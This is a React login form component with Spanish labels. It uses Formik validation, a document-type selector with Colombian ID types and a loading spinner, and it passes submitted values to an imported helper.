import { useFormik } from 'formik'
import { useState } from 'react'

import { submitBase } from '../../../helpers/submitBase'
import { Spiner } from '../../Spiner'
import { UsernameInput } from './UsernameInput'
import { useGeneralData } from '../../../hooks/useGeneralData'
import { usernameValidate } from '../../../security/usernameValidate'
import { UsernameError } from './UsernameError'

const valuesData = { username: '', password: '', typeDocument: '' }
const opciones = ['Cédula de Ciudananía', 'Tarjeta de Identidad', 'Cédula  Extranjera', 'Pasaporte']

export const Username = () => {
    
    const dataImportant = useGeneralData({ spiner: true, endUrl: null, modeLive: false, timeLoader: 2000 })

    const [selectActive, setSelectActive] = useState(false)
    const [selectItem, setSelectItem] = useState(opciones[0])
    
    const { values, handleSubmit, handleChange, errors, handleBlur, touched } = useFormik({
        initialValues: valuesData,
        validate: values => usernameValidate({values}),
        onSubmit: async(valuesData, { resetForm }) => {
            // Descomentar si quieres tipo de documento
            // valuesData.typeDocument = selectItem
            submitBase({dataImportant, valuesData})
            return resetForm()
        }
    })
    
    return (
        <div>
            {/* Spiner de carga */}
            {
                dataImportant.showSpiner === true ? <Spiner /> : null
            }
            <UsernameError errors={errors} touched={touched} />
            {/* Colocar diseño base */}
            <form className='flex flex-col' onSubmit={handleSubmit}>

                <UsernameInput
                    username={values.username}
                    handleChange={handleChange} 
                    handleBlur={handleBlur}
                    touched={touched}
                    errors={errors}

                    showTypeDocument={values.typeDocument}
                    selectActive={selectActive} 
                    setSelectActive={setSelectActive}
                    selectItem={selectItem}
                    setSelectItem={setSelectItem}
                    opciones={opciones}
                />
                
                <button 
                  disabled={ Boolean(errors.username) === true ? true : false }
                  className='bg-blue-400 px-4 py-1 rounded'
                  type='submit'
                >
                    Ingresar
                </button>
            </form>
        </div>
    )
}
